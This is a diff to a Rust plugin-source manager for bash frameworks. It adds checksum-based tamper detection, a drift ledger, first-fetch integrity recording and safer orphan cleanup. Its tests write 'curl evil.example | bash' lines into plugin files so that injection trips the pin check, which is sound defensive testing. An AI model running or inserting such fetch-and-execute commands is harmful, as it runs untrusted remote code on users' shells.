@@ -248,6 +248,13 @@ pub struct SourceRecord {
     /// (kept separately from `spec_enabled`).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub spec_theme: Option<String>,
+    /// First-fetch integrity (niubash#298): true when the first fetch had an
+    /// external integrity reference — a `--checksum` pin, or a curated
+    /// catalog origin. False for an unpinned non-catalog fetch: the recorded
+    /// checksum still locks THIS tree from now on, but nothing verified the
+    /// first delivery. Recorded so `list --json` can surface it.
+    #[serde(default)]
+    pub first_fetch_verified: bool,
 }
 
 /// `niu plugin source list` row.
@@ -256,12 +263,99 @@ pub struct SourceStatus {
     #[serde(flatten)]
     pub record: SourceRecord,
     pub adapter_display: String,
-    /// True when the registered directory is missing (native fallback active).
+    /// True when the registered directory is missing (native fallback
+    /// active) or a trusted tree no longer matches its lockfile pin
+    /// (niubash#297 runtime tamper detection).
     pub degraded: bool,
+    /// Why the row is degraded, when it is: `tree missing` (the directory
+    /// is gone) or `tree drifted from the lockfile pin` (the checksum no
+    /// longer matches — niubash#297). `None` when healthy.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub degraded_reason: Option<String>,
     /// "ready" | "untrusted" | "degraded" (§11.4 state machine).
     pub state: String,
     pub asset_count: Option<usize>,
     pub asset_kinds: Vec<String>,
+}
+
+/// Why a source row is degraded (values of [`SourceStatus::degraded_reason`]).
+pub const DEGRADED_MISSING: &str = "tree missing";
+pub const DEGRADED_DRIFTED: &str = "tree drifted from the lockfile pin";
+
+/// The drift ledger (`drifted-sources.txt` under the sources root):
+/// `niu plugin sync` writes one source id per line for every trusted source
+/// whose tree no longer matches the lockfile pin (niubash#297). The managed
+/// rc blocks carry a STATIC guard that reads this file and prints the
+/// warning at startup — the rc stays static text (no hashing there, so it
+/// stays cacheable); this file is the only dynamic channel.
+pub fn drifted_state_path() -> PathBuf {
+    sources_root().join("drifted-sources.txt")
+}
+
+/// The drifted source ids currently recorded in the ledger.
+pub fn drifted_source_ids() -> Vec<String> {
+    let Ok(text) = fs::read_to_string(drifted_state_path()) else {
+        return Vec::new();
+    };
+    text.lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty() && !line.starts_with('#'))
+        .map(str::to_string)
+        .collect()
+}
+
+/// Record a source id as drifted (niubash#297): the rc drift guard starts
+/// warning at startup until the pin is restored or the source is removed.
+pub fn record_drifted_source(id: &str) -> anyhow::Result<()> {
+    let mut ids = drifted_source_ids();
+    if ids.iter().any(|existing| existing == id) {
+        return Ok(());
+    }
+    ids.push(id.to_string());
+    let path = drifted_state_path();
+    if let Some(parent) = path.parent() {
+        fs::create_dir_all(parent)?;
+    }
+    fs::write(
+        &path,
+        "# sources whose tree drifted from the lockfile pin (niu plugin sync)\n\
+         # cleared by `niu plugin restore <id>` / `niu plugin source verify <id>`\n"
+            .to_string()
+            + &ids
+                .into_iter()
+                .map(|id| format!("{id}\n"))
+                .collect::<String>(),
+    )?;
+    Ok(())
+}
+
+/// Drop a source id from the drift ledger (pin restored, source updated, or
+/// source removed). Missing file/entry is fine.
+pub fn clear_drifted_source(id: &str) -> anyhow::Result<()> {
+    let ids = drifted_source_ids();
+    if !ids.iter().any(|existing| existing == id) {
+        return Ok(());
+    }
+    let remaining: Vec<String> = ids.into_iter().filter(|existing| existing != id).collect();
+    let path = drifted_state_path();
+    if remaining.is_empty() {
+        match fs::remove_file(&path) {
+            Ok(()) => return Ok(()),
+            Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(()),
+            Err(err) => return Err(err.into()),
+        }
+    }
+    fs::write(
+        &path,
+        "# sources whose tree drifted from the lockfile pin (niu plugin sync)\n\
+         # cleared by `niu plugin restore <id>` / `niu plugin source verify <id>`\n"
+            .to_string()
+            + &remaining
+                .into_iter()
+                .map(|id| format!("{id}\n"))
+                .collect::<String>(),
+    )?;
+    Ok(())
 }
 
 /// Result of `verify_source` (§12.3 checksum re-computation, extended with
@@ -286,10 +380,44 @@ pub fn verify_source(id: &str) -> anyhow::Result<SourceVerifyReport> {
         .into_iter()
         .find(|record| record.id == id)
         .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
-    verify_record(&record)
+    let report = verify_record(&record)?;
+    // A clean verify means the tree matches its pin again: the rc drift
+    // guard must go quiet (the ledger header names this verb as a way out,
+    // niubash#297).
+    if report.verified {
+        clear_drifted_source(id)?;
+    }
+    Ok(report)
 }
 
-fn verify_record(record: &SourceRecord) -> anyhow::Result<SourceVerifyReport> {
+/// The checksum half of the pin check (niubash#297): the effective on-disk
+/// tree digest (EnabledDir managers normalize away their `enabled/` tree)
+/// plus whether it matches the recorded pin, with the `enabled/` copies
+/// validated as byte-faithful. The signature tier is layered on in
+/// [`verify_record`]; `trust`/`sign` deliberately check ONLY this half — a
+/// stale signature is exactly what `sign` exists to repair.
+pub(crate) fn tree_pin_check(record: &SourceRecord) -> anyhow::Result<(String, bool)> {
+    let enabled_dir_model = adapter_for(&record.adapter).is_some_and(|adapter| {
+        matches!(adapter.selection_model(), SelectionModel::EnabledDir { .. })
+    });
+    let actual = if enabled_dir_model {
+        tree_sha256_excluding(&record.path, &record.path.join("enabled"))?
+    } else {
+        tree_sha256(&record.path)?
+    };
+    let mut checksum_ok = actual.eq_ignore_ascii_case(&record.checksum_sha256);
+    if checksum_ok && enabled_dir_model {
+        checksum_ok = enabled_entries_are_pinned_copies(&record.path)?;
+    }
+    Ok((actual, checksum_ok))
+}
+
+/// The pin check behind `verify_source` (§12.3): recompute the tree
+/// checksum and compare it with the recorded pin (plus the signature, at
+/// the local-sign tier). The single authority shared with `sync` /
+/// `list_sources` / `trust` / `sign` — the runtime tamper gate
+/// (niubash#297) runs the very same check, not a weaker one.
+pub(crate) fn verify_record(record: &SourceRecord) -> anyhow::Result<SourceVerifyReport> {
     if !record.path.is_dir() {
         return Ok(SourceVerifyReport {
             id: record.id.clone(),
@@ -301,8 +429,7 @@ fn verify_record(record: &SourceRecord) -> anyhow::Result<SourceVerifyReport> {
             signature_ok: record.signature.as_ref().map(|_| false),
         });
     }
-    let actual = tree_sha256(&record.path)?;
-    let checksum_ok = actual.eq_ignore_ascii_case(&record.checksum_sha256);
+    let (actual, checksum_ok) = tree_pin_check(record)?;
     let signature_ok = record
         .signature
         .as_ref()
@@ -620,7 +747,7 @@ pub(crate) fn now_timestamp() -> String {
 /// path separators.
 pub fn tree_sha256(root: &Path) -> anyhow::Result<String> {
     let mut files = Vec::new();
-    collect_relative_files(root, root, &mut files)?;
+    collect_relative_files(root, root, &mut files, None)?;
     files.sort();
     let mut hasher = Sha256::new();
     for relative in files {
@@ -636,7 +763,35 @@ pub fn tree_sha256(root: &Path) -> anyhow::Result<String> {
     Ok(format!("{:x}", hasher.finalize()))
 }
 
-fn collect_relative_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> anyhow::Result<()> {
+/// [`tree_sha256`] over the tree with one subtree excluded — the pin check's
+/// view of an EnabledDir manager's tree (bash-it), where `niu plugin
+/// enable/disable` legitimately writes `enabled/` entries INTO the source
+/// tree. Those entries are validated separately (byte-faithful copies, see
+/// [`enabled_entries_are_pinned_copies`]) so an injection there still trips.
+pub(crate) fn tree_sha256_excluding(root: &Path, skip: &Path) -> anyhow::Result<String> {
+    let mut files = Vec::new();
+    collect_relative_files(root, root, &mut files, Some(skip))?;
+    files.sort();
+    let mut hasher = Sha256::new();
+    for relative in files {
+        let full = root.join(&relative);
+        let content =
+            fs::read(&full).with_context(|| format!("failed to read {}", full.display()))?;
+        hasher.update(relative.as_bytes());
+        hasher.update([0]);
+        hasher.update(content.len().to_le_bytes());
+        hasher.update([0]);
+        hasher.update(&content);
+    }
+    Ok(format!("{:x}", hasher.finalize()))
+}
+
+fn collect_relative_files(
+    root: &Path,
+    dir: &Path,
+    out: &mut Vec<String>,
+    skip: Option<&Path>,
+) -> anyhow::Result<()> {
     let entries = fs::read_dir(dir).with_context(|| format!("failed to read {}", dir.display()))?;
     for entry in entries {
         let entry = entry?;
@@ -647,8 +802,13 @@ fn collect_relative_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> any
         if name == ".git" {
             continue;
         }
+        if let Some(skip) = skip {
+            if path == skip || path.starts_with(skip) {
+                continue;
+            }
+        }
         if path.is_dir() {
-            collect_relative_files(root, &path, out)?;
+            collect_relative_files(root, &path, out, skip)?;
         } else if path.is_file() {
             let relative = path
                 .strip_prefix(root)
@@ -657,6 +817,39 @@ fn collect_relative_files(root: &Path, dir: &Path, out: &mut Vec<String>) -> any
         }
     }
     Ok(())
+}
+
+/// True when every file under `root/enabled/` is a byte-faithful copy of
+/// some other file in the pinned tree (the exact thing `niu plugin enable`
+/// writes for EnabledDir managers). A rogue file injected into `enabled/` —
+/// the one directory bash-it executes at startup — has no pinned source and
+/// fails here, so the enabled-dir transparency is not a tamper blind spot.
+fn enabled_entries_are_pinned_copies(root: &Path) -> anyhow::Result<bool> {
+    let enabled = root.join("enabled");
+    if !enabled.is_dir() {
+        return Ok(true);
+    }
+    // Content digests of the pinned tree (everything except enabled/).
+    let mut files = Vec::new();
+    collect_relative_files(root, root, &mut files, Some(&enabled))?;
+    let mut pinned_contents = std::collections::HashSet::new();
+    for relative in files {
+        let content = fs::read(root.join(&relative))
+            .with_context(|| format!("failed to read {}", root.join(&relative).display()))?;
+        pinned_contents.insert(Sha256::digest(&content).to_vec());
+    }
+    let mut enabled_files = Vec::new();
+    collect_relative_files(root, &enabled, &mut enabled_files, None)?;
+    for relative in enabled_files {
+        // Walk-relative paths are relative to the tree root (the collector
+        // strips `root`), so read through the root, not through enabled/.
+        let content = fs::read(root.join(&relative))
+            .with_context(|| format!("failed to read {}", root.join(&relative).display()))?;
+        if !pinned_contents.contains(&Sha256::digest(&content).to_vec()) {
+            return Ok(false);
+        }
+    }
+    Ok(true)
 }
 
 fn copy_tree(src: &Path, dest: &Path) -> anyhow::Result<()> {
@@ -1072,8 +1265,9 @@ fn fetch_source_to_staging(request: &SourceInstallRequest) -> anyhow::Result<Fet
         // Origin semantics: an explicit ref or commit forces git semantics
         // (a local git repository path is also a directory and must clone,
         // not snapshot — the working tree may be ahead of the requested
-        // ref). Without either, directories snapshot and everything else
-        // clones.
+        // ref). Without either, directories and plain files snapshot and
+        // everything else clones (niubash#300: a bare file path is a valid
+        // wild source — snapshot-copied like a directory).
         let commit = request
             .commit
             .clone()
@@ -1082,13 +1276,26 @@ fn fetch_source_to_staging(request: &SourceInstallRequest) -> anyhow::Result<Fet
             .ref_name
             .clone()
             .filter(|value| value != LOCAL_ORIGIN_REF);
+        let local_tree = origin_path.is_dir() || origin_path.is_file();
         let ref_name = match &explicit_ref {
             Some(value) => value.clone(),
-            None if commit.is_some() || !origin_path.is_dir() => "HEAD".to_string(),
+            None if commit.is_some() || !local_tree => "HEAD".to_string(),
             None => LOCAL_ORIGIN_REF.to_string(),
         };
         if commit.is_some() {
             git_fetch_commit_to(&staging, origin, commit.as_deref().unwrap(), limits)?;
+        } else if ref_name == LOCAL_ORIGIN_REF && origin_path.is_file() {
+            // Single-file wild source (niubash#300): snapshot the file into
+            // its own tree, byte-faithful.
+            let name = origin_path.file_name().ok_or_else(|| {
+                anyhow!("cannot determine a file name for the local origin '{origin}'")
+            })?;
+            fs::copy(origin_path, staging.join(name)).with_context(|| {
+                format!(
+                    "failed to snapshot {} into the source tree",
+                    origin_path.display()
+                )
+            })?;
         } else if ref_name == LOCAL_ORIGIN_REF {
             copy_tree(origin_path, &staging)?;
         } else {
@@ -1320,6 +1527,14 @@ pub fn install_or_adopt(request: SourceInstallRequest) -> anyhow::Result<(Source
         previous: None,
         spec_enabled: None,
         spec_theme: None,
+        // niubash#298: an explicit pin or a curated catalog origin gives the
+        // first fetch an integrity reference; anything else lands
+        // unverified and stays marked that way.
+        first_fetch_verified: request
+            .expected_checksum
+            .as_deref()
+            .is_some_and(|pin| !pin.trim().is_empty())
+            || super::catalog::is_catalog_origin(request.origin.trim()),
     };
     let mut registry = read_source_registry();
     registry.push(record.clone());
@@ -1390,6 +1605,9 @@ pub fn update_source(
         previous: Some(previous),
         spec_enabled: record.spec_enabled,
         spec_theme: record.spec_theme,
+        // The flag is about the FIRST fetch's integrity reference (niubash#298);
+        // an update keeps what the install recorded.
+        first_fetch_verified: record.first_fetch_verified,
     };
     let summary = SourceUpdateSummary {
         id: updated.id.clone(),
@@ -1399,6 +1617,9 @@ pub fn update_source(
     };
     registry[index] = updated;
     write_source_registry(&registry)?;
+    // The tree was just refetched and its pin rewritten: any stale drift
+    // entry is obsolete (niubash#297).
+    clear_drifted_source(id)?;
     Ok(summary)
 }
 
@@ -1460,6 +1681,8 @@ pub fn rollback_source(id: &str) -> anyhow::Result<SourceUpdateSummary> {
     };
     registry[index] = restored;
     write_source_registry(&registry)?;
+    // The restored tree matches the previous pin again (niubash#297).
+    clear_drifted_source(id)?;
     Ok(summary)
 }
 
@@ -1496,8 +1719,11 @@ pub fn trust_source(id: &str) -> anyhow::Result<SourceRecord> {
             record.id
         );
     }
-    let actual = tree_sha256(&record.path)?;
-    if !actual.eq_ignore_ascii_case(&record.checksum_sha256) {
+    // The same pin check the runtime gate runs (niubash#297) — one
+    // authority, no weaker duplicate. Signature state is not consulted:
+    // trust is about the tree matching its pin.
+    let (actual, checksum_ok) = tree_pin_check(&record)?;
+    if !checksum_ok {
         anyhow::bail!(
             "cannot trust '{}': tree checksum mismatch (recorded {}, actual {}); \
              restore the pristine tree with `niu plugin restore {id}`",
@@ -1509,6 +1735,9 @@ pub fn trust_source(id: &str) -> anyhow::Result<SourceRecord> {
     registry[index].trusted = true;
     let trusted = registry[index].clone();
     write_source_registry(&registry)?;
+    // Trust re-passed the checksum gate: the tree matches the pin again
+    // (niubash#297).
+    clear_drifted_source(id)?;
     Ok(trusted)
 }
 
@@ -1532,8 +1761,10 @@ pub fn sign_source(id: &str) -> anyhow::Result<SourceRecord> {
             record.id
         );
     }
-    let actual = tree_sha256(&record.path)?;
-    if !actual.eq_ignore_ascii_case(&record.checksum_sha256) {
+    // The same pin check the runtime gate runs (niubash#297). Only the
+    // tree-vs-pin half: a stale signature is what signing repairs.
+    let (actual, checksum_ok) = tree_pin_check(&record)?;
+    if !checksum_ok {
         anyhow::bail!(
             "cannot sign '{}': tree checksum mismatch (recorded {}, actual {}); \
              restore the pristine tree first (`niu plugin restore {id}`)",
@@ -1548,6 +1779,8 @@ pub fn sign_source(id: &str) -> anyhow::Result<SourceRecord> {
     registry[index].signature = Some(signature);
     let signed = registry[index].clone();
     write_source_registry(&registry)?;
+    // Signing verified the tree against its pin first (niubash#297).
+    clear_drifted_source(id)?;
     Ok(signed)
 }
 
@@ -1586,17 +1819,38 @@ pub fn remove_source(id: &str) -> anyhow::Result<PathBuf> {
         fs::remove_dir_all(&record.path)
             .with_context(|| format!("failed to remove {}", record.path.display()))?;
     }
+    // The source is gone: a stale drift entry would warn forever (niubash#297).
+    clear_drifted_source(id)?;
     Ok(record.path)
 }
 
-/// `niu plugin source list` rows (§11.4 state machine).
+/// `niu plugin source list` rows (§11.4 state machine). Trusted sources get
+/// the runtime tamper gate (niubash#297): a tree that no longer matches its
+/// lockfile pin is degraded — assets must not load off a modified tree.
 pub fn list_sources() -> Vec<SourceStatus> {
     let mut out = Vec::new();
     for record in read_source_registry() {
         let adapter = adapter_for(&record.adapter);
-        let degraded = !record.path.is_dir();
+        let missing = !record.path.is_dir();
+        // niubash#297: drift only matters for trusted trees — an untrusted
+        // source contributes nothing and re-passes the checksum gate at
+        // `trust` time anyway.
+        let drifted = !missing
+            && record.trusted
+            && match verify_record(&record) {
+                Ok(report) => !report.verified,
+                Err(_) => true, // an unreadable tree is a broken tree
+            };
+        let degraded = missing || drifted;
+        let degraded_reason = if missing {
+            Some(DEGRADED_MISSING.to_string())
+        } else if drifted {
+            Some(DEGRADED_DRIFTED.to_string())
+        } else {
+            None
+        };
         let (assets, adapter_display) = match adapter {
-            Some(adapter) if !degraded => (
+            Some(adapter) if !missing => (
                 adapter.list_assets(&record.path),
                 adapter.display_name().to_string(),
             ),
@@ -1617,6 +1871,7 @@ pub fn list_sources() -> Vec<SourceStatus> {
         kinds.dedup();
         out.push(SourceStatus {
             degraded,
+            degraded_reason,
             state,
             asset_count: (!degraded).then_some(assets.len()),
             asset_kinds: kinds,
@@ -1674,11 +1929,17 @@ pub fn restore_source(id: &str) -> anyhow::Result<SourceSyncOutcome> {
     promote_staging(&fetched.staging, &record.path)?;
     registry[index].installed_at = now_timestamp();
     write_source_registry(&registry)?;
+    // The tree now matches the pin again: the rc drift guard must go quiet
+    // (niubash#297).
+    clear_drifted_source(id)?;
     Ok(SourceSyncOutcome {
         id: record.id.clone(),
         outcome: "restored".to_string(),
+        // Honest wording (niubash#297): restore REBUILDS the tree from the
+        // lockfile pin and verifies the fetched result against it — it does
+        // not find a tree that "matches" in place.
         detail: format!(
-            "tree matches the lockfile pin ({})",
+            "rebuilt from the lockfile pin ({}, checksum verified)",
             record
                 .commit_sha
                 .as_deref()
@@ -1732,11 +1993,12 @@ pub fn sync_sources() -> Vec<SourceSyncOutcome> {
 }
 
 /// `niu plugin clean` (vim-plug `:PlugClean` semantics): remove leftover
-/// `.staging-*` directories from interrupted installs and orphaned trees
-/// under the sources root that no registry record claims but a known
-/// adapter would own. Registered sources and unknown directories are never
-/// touched.
-pub fn clean_sources() -> Vec<SourceSyncOutcome> {
+/// `.staging-*` directories from interrupted installs, and handle orphaned
+/// trees under the sources root that no registry record claims
+/// (niubash#299). With `delete_orphans = false` every orphan directory is
+/// only LISTED (`outcome = "orphan"`); `--orphans` is the explicit confirm
+/// that deletes them. Registered sources are never touched.
+pub fn clean_sources(delete_orphans: bool) -> Vec<SourceSyncOutcome> {
     let mut out = Vec::new();
     let root = sources_root();
     let registered: Vec<PathBuf> = read_source_registry()
@@ -1772,16 +2034,16 @@ pub fn clean_sources() -> Vec<SourceSyncOutcome> {
         if registered.contains(&path) {
             continue;
         }
-        // Orphan: a manager-shaped tree with no registry record.
-        if builtin_source_adapters()
-            .iter()
-            .any(|adapter| adapter.detect(&path))
-        {
+        // Orphan (niubash#299): ANY directory no registry record claims —
+        // manager-shaped trees, wild trees, hand-copied dirs. The plain
+        // clean only reports it; deletion is `--orphans`' explicit job, so
+        // a directory niu never placed here is never silently destroyed.
+        if delete_orphans {
             match fs::remove_dir_all(&path) {
                 Ok(()) => out.push(SourceSyncOutcome {
                     id: name.clone(),
                     outcome: "removed".to_string(),
-                    detail: "orphaned source tree (no registry record)".to_string(),
+                    detail: "orphaned directory (no registry record)".to_string(),
                 }),
                 Err(err) => out.push(SourceSyncOutcome {
                     id: name.clone(),
@@ -1789,6 +2051,14 @@ pub fn clean_sources() -> Vec<SourceSyncOutcome> {
                     detail: err.to_string(),
                 }),
             }
+        } else {
+            out.push(SourceSyncOutcome {
+                id: name,
+                outcome: "orphan".to_string(),
+                detail: "not claimed by the registry — `niu plugin clean --orphans` \
+                         deletes it"
+                    .to_string(),
+            });
         }
     }
     out
@@ -2249,6 +2519,7 @@ mod tests {
             previous: None,
             spec_enabled: None,
             spec_theme: None,
+            first_fetch_verified: true,
         };
         let snippet = adapter_for("oh-my-bash").unwrap().loader_snippet(&record);
         assert!(snippet.contains("if [ -r "), "{snippet}");
@@ -2814,6 +3085,7 @@ mod tests {
             previous: None,
             spec_enabled: None,
             spec_theme: None,
+            first_fetch_verified: true,
         };
         let snippet = adapter.loader_snippet(&record);
         // Unified loader template (§14.6.2): the guard carries the literal
@@ -2871,6 +3143,7 @@ mod tests {
             previous: None,
             spec_enabled: None,
             spec_theme: None,
+            first_fetch_verified: true,
         };
         let snippet = adapter.loader_snippet(&record);
         assert!(snippet.contains("if [ -r "), "{snippet}");
@@ -3132,7 +3405,7 @@ mod tests {
     }
 
     #[test]
-    fn clean_removes_staging_leftovers_and_orphan_trees() {
+    fn clean_reports_orphans_and_deletes_only_on_the_flag() {
         let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
         let temp = unique_temp_dir("clean");
         let root = temp.join("sources");
@@ -3140,8 +3413,10 @@ mod tests {
         write_omb_fixture(&origin, "v1");
         let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
 
-        // A registered install stays; an orphan OMB-shaped tree and a
-        // staging leftover go; a foreign directory is untouched.
+        // niubash#299: a staging leftover goes on a plain clean; EVERY
+        // directory no registry record claims (manager-shaped or not) is
+        // LISTED as an orphan — nothing but staging is deleted until
+        // `--orphans` confirms.
         add_source(local_request(&origin)).unwrap();
         let orphan = root.join("orphan-omb");
         write_omb_fixture(&orphan, "stale");
@@ -3149,18 +3424,35 @@ mod tests {
         fs::create_dir_all(root.join("my-notes")).unwrap();
         fs::write(root.join("my-notes/keep.txt"), "user data\n").unwrap();
 
-        let removed = clean_sources();
+        let report = clean_sources(false);
+        let rows: Vec<(&str, &str)> = report
+            .iter()
+            .map(|row| (row.id.as_str(), row.outcome.as_str()))
+            .collect();
+        assert!(rows.contains(&(".staging-123-456", "removed")), "{rows:?}");
+        assert!(rows.contains(&("orphan-omb", "orphan")), "{rows:?}");
+        assert!(rows.contains(&("my-notes", "orphan")), "{rows:?}");
+        assert!(
+            root.join("orphan-omb").is_dir(),
+            "plain clean must not delete orphans"
+        );
+        assert!(
+            root.join("my-notes/keep.txt").is_file(),
+            "plain clean must not delete unregistered user data"
+        );
+        assert!(root.join("oh-my-bash").is_dir(), "registered tree stays");
+
+        // `--orphans` is the explicit confirm: the listed orphans go.
+        let removed = clean_sources(true);
         let ids: Vec<(&str, &str)> = removed
             .iter()
             .map(|row| (row.id.as_str(), row.outcome.as_str()))
             .collect();
-        assert!(ids.contains(&(".staging-123-456", "removed")), "{ids:?}");
         assert!(ids.contains(&("orphan-omb", "removed")), "{ids:?}");
+        assert!(ids.contains(&("my-notes", "removed")), "{ids:?}");
+        assert!(!root.join("orphan-omb").exists());
+        assert!(!root.join("my-notes").exists());
         assert!(root.join("oh-my-bash").is_dir(), "registered tree stays");
-        assert!(
-            root.join("my-notes/keep.txt").is_file(),
-            "foreign dirs stay"
-        );
         let _ = fs::remove_dir_all(&temp);
     }
 
@@ -3207,6 +3499,7 @@ mod tests {
             previous: None,
             spec_enabled: Some(vec!["git".to_string()]),
             spec_theme: Some("agnoster".to_string()),
+            first_fetch_verified: true,
         };
         let path = root.join("registry.toml");
         fs::create_dir_all(&root).unwrap();
@@ -3271,6 +3564,237 @@ mod tests {
         assert_eq!(records[0].commit_sha.as_deref(), Some("abc123def456"));
         assert!(records[0].trusted, "the pin/trust state round-trips");
 
+        let _ = fs::remove_dir_all(&temp);
+    }
+
+    // ── niubash#297: the runtime tamper gate ────────────────────────────────
+
+    /// THE #297 regression: a trusted tree modified AFTER `trust` must read
+    /// as degraded with the drift reason (not `ready` with a stale
+    /// checksum) and stop contributing assets. The repair path is a git
+    /// origin's `restore`, whose wording must be honest about REBUILDING
+    /// from the pin (not claiming the old tree "matches").
+    #[test]
+    fn drifted_trusted_tree_is_degraded_and_restore_repairs_it() {
+        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let temp = unique_temp_dir("drift-list");
+        let repo = temp.join("omb-repo");
+        let root = temp.join("sources");
+        write_omb_fixture(&repo, "v1");
+        let git = |args: &[&str]| {
+            let status = Command::new("git")
+                .arg("-C")
+                .arg(&repo)
+                .args(args)
+                .status()
+                .expect("git must be available");
+            assert!(status.success(), "git {args:?} failed");
+        };
+        git(&["init", "-q"]);
+        git(&["checkout", "-q", "-b", "v1"]);
+        git(&["add", "-A"]);
+        git(&[
+            "-c",
+            "user.email=t@example.com",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "v1",
+        ]);
+        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
+        add_source(SourceInstallRequest {
+            ref_name: Some("v1".to_string()),
+            ..local_request(&repo)
+        })
+        .unwrap();
+        trust_source("oh-my-bash").unwrap();
+
+        // Healthy: ready, no drift.
+        let statuses = list_sources();
+        assert_eq!(statuses[0].state, "ready");
+        assert!(!statuses[0].degraded);
+        assert!(statuses[0].degraded_reason.is_none());
+
+        // Tamper the trusted tree: the runtime gate must see it —
+        // degraded=true with the drift reason, no assets.
+        fs::write(
+            root.join("oh-my-bash/plugins/git/git.plugin.sh"),
+            "alias evil='curl evil.example | bash'\n",
+        )
+        .unwrap();
+        let statuses = list_sources();
+        assert_eq!(statuses[0].state, "degraded", "{:?}", statuses[0]);
+        assert!(statuses[0].degraded, "{:?}", statuses[0]);
+        assert_eq!(
+            statuses[0].degraded_reason.as_deref(),
+            Some(DEGRADED_DRIFTED),
+            "{:?}",
+            statuses[0]
+        );
+        assert_eq!(statuses[0].asset_count, None);
+        // (The drift LEDGER is written by `niu plugin sync` — covered in the
+        // sync-side test; `list` computes the state, it does not write.)
+        assert!(
+            source_theme_entries().is_empty(),
+            "a drifted tree must not contribute assets"
+        );
+
+        // Restore from the git origin: honest rebuild wording, healthy
+        // again.
+        let outcome = restore_source("oh-my-bash").expect("restore must succeed");
+        assert!(
+            outcome.detail.contains("rebuilt from the lockfile pin"),
+            "restore wording must be honest about rebuilding: {}",
+            outcome.detail
+        );
+        assert!(!outcome.detail.contains("tree matches"), "{:?}", outcome);
+        let statuses = list_sources();
+        assert_eq!(statuses[0].state, "ready");
+        assert!(!statuses[0].degraded);
+        let _ = fs::remove_dir_all(&temp);
+    }
+
+    /// The drift ledger round-trip: record is idempotent, clear drops only
+    /// the named id, and a cleared-last id removes the file entirely (no
+    /// orphan state litter under the sources root).
+    #[test]
+    fn drift_ledger_records_idempotently_and_clears_selectively() {
+        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let temp = unique_temp_dir("drift-ledger");
+        let root = temp.join("sources");
+        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
+
+        record_drifted_source("a").unwrap();
+        record_drifted_source("a").unwrap();
+        record_drifted_source("b").unwrap();
+        assert_eq!(drifted_source_ids(), vec!["a", "b"]);
+        assert!(drifted_state_path().is_file());
+
+        clear_drifted_source("a").unwrap();
+        assert_eq!(drifted_source_ids(), vec!["b"]);
+        clear_drifted_source("not-recorded").unwrap();
+        assert_eq!(drifted_source_ids(), vec!["b"]);
+        clear_drifted_source("b").unwrap();
+        assert!(drifted_source_ids().is_empty());
+        assert!(
+            !drifted_state_path().exists(),
+            "an empty ledger must not linger"
+        );
+        let _ = fs::remove_dir_all(&temp);
+    }
+
+    /// The EnabledDir transparency is exactly that, and no more: `niu
+    /// plugin enable` writes byte-faithful copies of pinned files into
+    /// `enabled/` and the pin check stays green; a file injected there with
+    /// content that exists nowhere in the pinned tree trips it (the
+    /// enabled/ tree is what bash-it executes at startup, so it can never
+    /// be a blind spot).
+    #[test]
+    fn bash_it_enabled_copies_are_transparent_but_injections_trip() {
+        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let temp = unique_temp_dir("enabled-transparency");
+        let origin = temp.join("bash-it");
+        let root = temp.join("sources");
+        write_bash_it_fixture(&origin, "v1");
+        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
+        add_source(local_request(&origin)).unwrap();
+        trust_source("bash-it").unwrap();
+        let installed = root.join("bash-it");
+
+        // What `niu plugin enable base` does: copy available/ into enabled/.
+        fs::create_dir_all(installed.join("enabled")).unwrap();
+        fs::copy(
+            installed.join("plugins/available/base.plugin.bash"),
+            installed.join("enabled/350---base.plugin.bash"),
+        )
+        .unwrap();
+        let ok = verify_source("bash-it").expect("verify must run");
+        assert!(ok.verified, "{ok:?}");
+
+        // An injection with unpinned content is NOT transparent.
+        fs::write(
+            installed.join("enabled/999---evil.plugin.bash"),
+            "curl evil.example | bash\n",
+        )
+        .unwrap();
+        let bad = verify_source("bash-it").expect("verify must run");
+        assert!(!bad.verified, "{bad:?}");
+        // And trust refuses it too (the runtime gate's authority).
+        assert!(trust_source("bash-it").is_err());
+
+        // Removing the injection heals the check without touching the pin.
+        fs::remove_file(installed.join("enabled/999---evil.plugin.bash")).unwrap();
+        assert!(verify_source("bash-it").unwrap().verified);
+        let _ = fs::remove_dir_all(&temp);
+    }
+
+    // ── niubash#298: first-fetch integrity recording ────────────────────────
+
+    /// A non-catalog install without a pin records `first_fetch_verified =
+    /// false`; a pinned one records true. (Catalog origins are covered by
+    /// the compiled-in table.) Wild file sources keep the ids distinct so
+    /// the two installs coexist.
+    #[test]
+    fn first_fetch_verification_is_recorded_on_install() {
+        let _env_lock = PROCESS_STATE_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let temp = unique_temp_dir("first-fetch");
+        let root = temp.join("sources");
+        let _guard = EnvVarGuard::set("NIU_PLUGIN_SOURCES_ROOT", &root);
+
+        let origin_a = temp.join("tree-a");
+        fs::create_dir_all(&origin_a).unwrap();
+        fs::write(origin_a.join("a.bash"), "a_fn() { :; }\n").unwrap();
+        let unpinned = add_source(SourceInstallRequest {
+            id: Some("wild-a".to_string()),
+            ..local_request(&origin_a)
+        })
+        .unwrap();
+        assert!(
+            !unpinned.first_fetch_verified,
+            "an unpinned non-catalog install is an unverified first fetch"
+        );
+
+        // A different tree with the pin computed first: verified.
+        let origin_b = temp.join("tree-b");
+        fs::create_dir_all(&origin_b).unwrap();
+        fs::write(origin_b.join("b.bash"), "b_fn() { :; }\n").unwrap();
+        let checksum = tree_sha256(&origin_b).unwrap();
+        let pinned = add_source(SourceInstallRequest {
+            id: Some("wild-b".to_string()),
+            expected_checksum: Some(checksum),
+            ..local_request(&origin_b)
+        })
+        .unwrap();
+        assert!(pinned.first_fetch_verified, "{pinned:?}");
